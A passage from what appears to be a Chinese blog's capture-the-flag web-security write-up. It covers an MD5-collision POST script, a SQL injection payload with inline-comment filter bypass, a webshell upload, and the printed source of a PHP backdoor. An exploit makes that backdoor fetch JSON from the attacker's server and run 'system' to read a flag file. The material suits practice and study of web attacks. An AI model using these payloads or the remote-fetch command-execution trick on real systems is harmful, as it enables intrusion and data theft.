-<p>A.A[]=1</p>
-<h2 id="md5-crack"><a href="#md5-crack" class="headerlink" title="md5 crack"></a>md5 crack</h2><p>fastcoll.exe -p 1.txt -o 1.bin 2.bin</p>
-<p>py读取二进制流在urlencode一下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">f1 = open(<span class="string">'1.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">f2 = open(<span class="string">'2.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'data1'</span>:f1,</span><br><span class="line">    <span class="string">'data2'</span>:f2</span><br><span class="line">&#125;</span><br><span class="line">print(urllib.parse.quote(f1))</span><br><span class="line">print(urllib.parse.quote(f2))</span><br><span class="line">flag = requests.post(<span class="string">"http://114.55.36.69:8006"</span>, data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
-
-<p>然后通过burp或者py都可以直接获得flag</p>
-<p>这里用hackbar会变成二次url编码，然后会出问题</p>
-<h2 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h2><p>word=%’and 1=2 /<em>!32302union</em>/ /<em>!32302select</em>/ 1,2,flag from admin#&amp;number=5</p>
-<p>有点骚，这个操作，内联注释绕过，虽然不知道原理，还是学到了</p>
-<p>注释是c语言注释格式/* */  !和数字，这个数字不能太小</p>
-<p>。。flag不对。。</p>
-<h2 id="玩个蛇皮"><a href="#玩个蛇皮" class="headerlink" title="玩个蛇皮"></a>玩个蛇皮</h2><p>玩个蛇皮 <a href="http://114.55.36.69:8011" target="_blank" rel="noopener">http://114.55.36.69:8011</a><br>简单js执行命令即可</p>
-<h2 id="ddcms"><a href="#ddcms" class="headerlink" title="ddcms"></a>ddcms</h2><p>查看默认管理后端<br>弱口令，传小马，连上拿flag</p>
-<p>1de3ce6607a0f95as1861c4bbb3687b8</p>
-<h2 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;</span><br><span class="line">    $i = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg=='</span>;</span><br><span class="line">    <span class="keyword">echo</span> str_replace(<span class="string">'%id%'</span>, $h, base64_decode($i));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $j = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+'</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode($j);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>代码审计，发觉可以命令执行</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'ip地址'</span>.ljust(<span class="number">15</span>, <span class="string">'/'</span>)</span><br><span class="line">addr = <span class="string">'a'</span>*<span class="number">10</span> + ip[<span class="number">-10</span>:] + <span class="string">'b'</span>*<span class="number">10</span> + ip[:<span class="number">5</span>] + <span class="string">"c"</span>*<span class="number">10</span></span><br><span class="line">print(addr)</span><br><span class="line">print(len(addr))</span><br><span class="line">md5 = hashlib.md5(addr.encode(<span class="string">'ascii'</span>)).hexdigest()</span><br><span class="line">print(md5)</span><br><span class="line">http_addr = <span class="string">"http://"</span> + addr</span><br><span class="line">print(http_addr)</span><br></pre></td></tr></table></figure>
-
-
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /upload/dama.php HTTP/1.1</span><br><span class="line">Host: 114.55.36.69:8020</span><br><span class="line">User-Agent:md5</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 64</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://114.55.36.69:8020/upload/dama.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">pass=aaaaaaaaaaxxxxxx///bbbbbbbbbbxxxxcccccccccc&amp;submit=submit</span><br></pre></td></tr></table></figure>
-
-
-<p>部署在服务器上，默认以80端口，这样就不用index.php了</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"f"</span>=&gt;<span class="string">"system"</span>,</span><br><span class="line">    <span class="string">"d"</span>=&gt;<span class="string">"cat ../flag.php"</span></span><br><span class="line">);</span><br><span class="line">$url = json_encode($url);</span><br><span class="line"><span class="keyword">echo</span> $url;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web安全</category>
-        <category>练习</category>
-      </categories>
-      <tags>
-        <tag>web安全,练习</tag>
       </tags>
   </entry>
   <entry>
